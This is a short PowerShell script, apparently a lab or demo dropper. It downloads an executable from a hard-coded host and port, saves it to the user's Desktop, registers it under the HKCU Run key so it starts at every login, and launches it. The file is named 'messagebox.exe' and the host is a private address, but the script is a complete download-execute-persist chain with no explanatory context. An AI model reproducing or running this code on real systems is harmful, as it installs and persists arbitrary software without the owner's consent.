
$ip = "192.168.1.145"
$port = "8000"
$file = "messagebox.exe"
$user = (whoami).Split("\")[-1]
$path = "C:\Users\${user}\Desktop\test.exe"
$name = "MiPrograma"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Invoke-WebRequest -Uri "http://${ip}:${port}/${file}" -OutFile "${path}"
Set-ItemProperty -Path $regPath -Name $name -Value "`"$path`""
& $path